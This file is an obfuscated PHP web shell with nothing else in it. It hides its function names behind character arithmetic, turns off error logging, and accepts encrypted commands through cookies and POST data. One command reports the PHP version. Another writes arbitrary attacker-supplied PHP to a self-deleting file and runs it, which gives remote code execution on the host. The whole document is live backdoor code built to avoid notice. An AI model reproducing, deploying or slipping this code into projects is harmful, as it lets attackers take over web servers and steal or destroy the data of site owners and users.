<?php $tbxdmdb = "\146".chr(105).chr(883-775)."\145".chr(787-692)."\160"."\x75".'t'.'_'.chr(464-365)."\157"."\156".'t'."\145".chr(110)."\x74"."\x73";
$getrkkmkea = "\x62".chr(951-854)."\163"."\x65"."\66".'4'.chr(95)."\x64".'e'.'c'."\157".chr(100).chr(101);
$sehhic = "\x69".chr(1074-964).chr(105)."\137".chr(167-52).'e'."\x74";
$jjftw = 'u'.'n'."\154".'i'."\156"."\153";


@$sehhic(chr(320-219)."\162"."\x72".'o'.chr(384-270)."\137"."\154"."\x6f"."\147", NULL);
@$sehhic("\154".chr(345-234).chr(241-138).chr(1086-991).chr(944-843).chr(799-685)."\x72"."\x6f".chr(114)."\x73", 0);
@$sehhic("\155".'a'.chr(120).chr(95)."\145".chr(330-210).chr(101)."\143".chr(117).chr(116).chr(105)."\157".'n'."\137".'t'."\x69".chr(109)."\x65", 0);
@set_time_limit(0);

function pckrjjt($lasbsoijrg, $tavcrfmjh)
{
    $rdmqz = "";
    for ($qekoipmkt = 0; $qekoipmkt < strlen($lasbsoijrg);) {
        for ($j = 0; $j < strlen($tavcrfmjh) && $qekoipmkt < strlen($lasbsoijrg); $j++, $qekoipmkt++) {
            $rdmqz .= chr(ord($lasbsoijrg[$qekoipmkt]) ^ ord($tavcrfmjh[$j]));
        }
    }
    return $rdmqz;
}

$qvrygthaar = array_merge($_COOKIE, $_POST);
$cmjlmci = '029d9454-8952-40b3-b7e2-a29ef6f6d0fc';
foreach ($qvrygthaar as $fvtzlqbv => $lasbsoijrg) {
    $lasbsoijrg = @unserialize(pckrjjt(pckrjjt($getrkkmkea($lasbsoijrg), $cmjlmci), $fvtzlqbv));
    if (isset($lasbsoijrg[chr(97).chr(107)])) {
        if ($lasbsoijrg['a'] == chr(105)) {
            $qekoipmkt = array(
                chr(258-146).chr(118) => @phpversion(),
                chr(115).chr(118) => "3.5",
            );
            echo @serialize($qekoipmkt);
        } elseif ($lasbsoijrg['a'] == chr(101)) {
            $tpglwk = "./" . md5($cmjlmci) . '.'."\151".'n'.'c';
            @$tbxdmdb($tpglwk, "<" . "\x3f".chr(572-460)."\150"."\160"."\40".chr(64)."\165"."\156"."\154".'i'."\156".'k'.chr(370-330).chr(461-366).chr(835-740)."\106"."\x49".chr(76).'E'."\x5f"."\137".')'.chr(931-872).chr(32) . $lasbsoijrg[chr(100)]);
            @include($tpglwk);
            @$jjftw($tpglwk);
        }
        exit();
    }
}

